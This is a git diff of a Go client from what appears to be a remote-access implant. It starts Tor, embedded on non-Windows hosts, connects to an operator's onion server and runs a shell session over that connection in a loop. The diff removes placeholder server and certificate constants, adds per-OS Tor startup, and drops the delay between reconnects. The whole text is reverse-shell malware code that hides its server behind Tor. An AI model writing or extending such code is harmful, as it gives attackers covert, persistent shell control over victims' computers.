@@ -1,4 +1,4 @@
-// +build !notor
+// +build !notor, !windows
 
 package client
 
@@ -7,28 +7,12 @@ import (
 	"crypto/x509"
 	"log"
 	"net"
+	"runtime"
 	"time"
 
+	"github.com/cretz/bine/process/embedded"
 	"github.com/cretz/bine/tor"
 )
-
-const (
-	// serverDomain needs to be changed to your address
-	serverDomain = "youronionadresshere.onion"
-	serverPort   = ":1337"
-	serverAddr   = serverDomain + serverPort
-)
-
-// serverCert needs to be changed to the TLS certificate of the server
-// intendation breaks the certificate
-const serverCert = `-----BEGIN CERTIFICATE-----
-____ CERTIFICATE GOES HERE | DONT INDENT ____
------END CERTIFICATE-----`
-
-type connection struct {
-	Conn    net.Conn
-	Sysinfo string
-}
 
 func connect(dialer *tor.Dialer) (net.Conn, error) {
 	conn, err := dialer.Dial("tcp", serverAddr)
@@ -49,7 +33,12 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 
 func NetClient() {
 	log.Println("NetClient")
-	conf := tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
+	var conf tor.StartConf
+	if runtime.GOOS == "windows" {
+		conf = tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
+	} else {
+		conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
+	}
 	t, err := tor.Start(nil, &conf)
 	if err != nil {
 		log.Println("[!] Tor could not be started:", err)
@@ -67,6 +56,5 @@ func NetClient() {
 		c := new(connection)
 		c.Conn = conn
 		c.shell()
-		time.Sleep(10 * time.Second)
 	}
 }
